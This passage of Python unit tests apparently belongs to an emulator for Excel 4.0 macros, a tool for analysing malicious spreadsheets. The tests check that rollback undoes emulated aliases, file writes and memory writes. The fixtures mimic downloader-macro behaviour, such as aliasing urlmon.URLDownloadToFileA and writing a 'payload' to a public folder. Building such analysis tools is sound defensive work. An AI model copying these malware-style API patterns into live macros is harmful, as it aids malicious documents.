        replaced = view.names.resolve('auto_open')
        assert replaced is not None and replaced.formula is not None
        self.assertEqual(synthesize_formula(replaced.formula), '42')
        engine.rollback(position)
        self.assertEqual(view.names.resolve('auto_open'), entry)

    def test_a_rollback_undoes_an_alias_the_rolled_back_run_registered(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        engine.register_alias('old', 'Kernel32.Sleep')
        position = engine.snapshot()
        engine.register_alias('old', 'urlmon.URLDownloadToFileA')
        engine.register_alias('fresh', 'urlmon.URLDownloadToFileA')
        self.assertEqual(engine.aliases, {
            'old': 'urlmon.URLDownloadToFileA',
            'fresh': 'urlmon.URLDownloadToFileA',
        })
        engine.rollback(position)
        self.assertEqual(engine.aliases, {'old': 'Kernel32.Sleep'})

    def test_a_rollback_undoes_the_files_a_run_opened_and_wrote(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        position = engine.snapshot()
        engine.open_file(r'C:\Users\Public\note.txt')
        self.assertTrue(engine.write_file(r'C:\Users\Public\note.txt', 'payload'))
        engine.rollback(position)
        self.assertEqual(engine.files.size(r'C:\Users\Public\note.txt'), None)
        self.assertFalse(engine.write_file(r'C:\Users\Public\note.txt', 'payload'))

    def test_a_rollback_undoes_the_memory_a_run_allocated_and_wrote(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        position = engine.snapshot()
        base = engine.allocate_memory(4194304, 4096)
        self.assertTrue(engine.write_memory(base, b'\xde\xad\xbe\xef', 4))
        self.assertEqual(engine.memory.peek(base, 4), b'\xde\xad\xbe\xef')
        engine.rollback(position)
        self.assertEqual(engine.memory.peek(base, 4), None)
        self.assertFalse(engine.write_memory(base, b'\xde\xad\xbe\xef', 4))

    def test_a_rollback_undoes_the_failed_write_marks_a_run_made(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        first = XlmReference('Doc1', 200, 52)
        second = XlmReference('Doc1', 201, 52)
        engine.mark_failed(first)
        position = engine.snapshot()
        engine.mark_failed(second)
        engine.unmark_failed(first)
        self.assertEqual(engine.failed_writes, {second})
        engine.rollback(position)
        self.assertEqual(engine.failed_writes, {first})
